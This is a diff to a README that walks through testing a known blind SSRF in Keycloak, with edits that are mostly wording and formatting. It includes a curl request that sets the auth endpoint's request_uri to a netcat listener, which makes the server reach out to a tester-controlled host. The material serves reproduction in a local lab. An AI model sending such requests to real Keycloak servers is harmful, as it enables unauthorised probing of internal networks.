@@ -1,13 +1,14 @@
 # Keycloak Blind SSRF POC
 
-This is a step by step documentation about how to test the blind ssrf found by Lauritz Holtmann and documented in his [blog post](https://security.lauritz-holtmann.de/post/sso-security-ssrf/).  
+This is a step by step walk-through about how to test the blind ssrf found by Lauritz Holtmann and documented in his [blog post](https://security.lauritz-holtmann.de/post/sso-security-ssrf/).  
 He also [briefly explained how to test it](https://twitter.com/_lauritz_/status/1347246269631238145). This is just a more detailed explanation.
 
 All credits go to [Lauritz](https://twitter.com/_lauritz_).
 
 # Setup 
 
-I use Docker on Mac OSX here.
+I use Docker on Mac OSX here.  
+I needed three shells, one running the Keycloak instance, one for the listener and one for the curl request.
 
 ## Defender
 
@@ -56,12 +57,12 @@ In another shell you have to do one request with curl. You have to change that t
 curl "http://<Keycloak_host_or_ip>:<Keycloak_port>/auth/realms/<Keycloak_realm>/protocol/openid-connect/auth?scope=openid&response_type=code&redirect_uri=valid&state=a&nonce=b&client_id=<Keycloak_Client_ID>&request_uri=http://<Netcat_listener_ip>:<Netcat_listener_port>/"
 ```
 
-The important parts here are:  
-<Keycloak_host_or_ip> in my case "localhost". 
-<Keycloak_port> in my case "8080". 
-<Keycloak_realm> the realm used by Keycloak. The default is "master". That is what I use here.  
-<Netcat_listener_ip> the ip address of the netcat listener. 
-<Netcat_listener_port> the port of the netcat listener. 
+The important parts are:
+* <Keycloak_host_or_ip> in my case "localhost".
+* <Keycloak_port> in my case "8080".
+* <Keycloak_realm> the realm used by Keycloak. The default is "master". That is what I use here.
+* <Netcat_listener_ip> the ip address of the netcat listener.
+* <Netcat_listener_port> the port of the netcat listener.
 
 So the query in my case is
 ```
